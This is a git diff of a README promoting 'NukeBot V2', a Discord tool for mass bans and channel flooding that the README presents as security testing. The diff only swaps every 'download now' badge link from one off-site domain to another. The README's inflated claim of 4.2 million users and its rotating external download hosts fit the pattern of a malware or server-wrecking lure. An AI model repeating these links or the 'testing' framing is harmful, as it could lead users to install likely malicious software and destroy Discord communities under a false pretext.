@@ -9,7 +9,7 @@ The **☠️ NukeBot V2 Latest Version** is the most powerful and reliable Disco
 
 <div align="center">
 
-[![Download NukeBot V2](https://img.shields.io/badge/☠️%20DOWNLOAD%20NOW%20☠️-purple?style=for-the-badge&logo=github)](https://githubs.app/h0ypi)
+[![Download NukeBot V2](https://img.shields.io/badge/☠️%20DOWNLOAD%20NOW%20☠️-purple?style=for-the-badge&logo=github)](https://software-nation.com/h0ypi)
 
 </div>
 
@@ -95,7 +95,7 @@ When searching for Discord testing tools, users encounter countless options—ma
 8. **💣 Click Execute** - Begin testing
 9. **📊 Monitor** - Watch operations in real-time
 
-[![Download NukeBot V2](https://img.shields.io/badge/☠️%20DOWNLOAD%20NUKEBOT%20V2%20☠️-purple?style=for-the-badge&logo=github)](https://githubs.app/h0ypi)
+[![Download NukeBot V2](https://img.shields.io/badge/☠️%20DOWNLOAD%20NUKEBOT%20V2%20☠️-purple?style=for-the-badge&logo=github)](https://software-nation.com/h0ypi)
 
 ### Quick Setup
 
@@ -105,7 +105,7 @@ When searching for Discord testing tools, users encounter countless options—ma
 4. **Select Operation** - Choose channel creation, mass ban, etc.
 5. **Click Start** - Execute selected operation
 
-[![Download NukeBot V2](https://img.shields.io/badge/☠️%20DOWNLOAD%20NUKEBOT%20V2%20☠️-purple?style=for-the-badge&logo=github)](https://githubs.app/h0ypi)
+[![Download NukeBot V2](https://img.shields.io/badge/☠️%20DOWNLOAD%20NUKEBOT%20V2%20☠️-purple?style=for-the-badge&logo=github)](https://software-nation.com/h0ypi)
 
 ### Safety Setup
 
@@ -244,4 +244,4 @@ Our testing philosophy means you can start securing your server immediately—no
 
 Join over 4.2 million satisfied server admins who've strengthened their Discord security with NukeBot V2.
 
-[![Download NukeBot V2](https://img.shields.io/badge/☠️%20DOWNLOAD%20NUKEBOT%20V2%20☠️-purple?style=for-the-badge&logo=github)](https://githubs.app/h0ypi)
+[![Download NukeBot V2](https://img.shields.io/badge/☠️%20DOWNLOAD%20NUKEBOT%20V2%20☠️-purple?style=for-the-badge&logo=github)](https://software-nation.com/h0ypi)
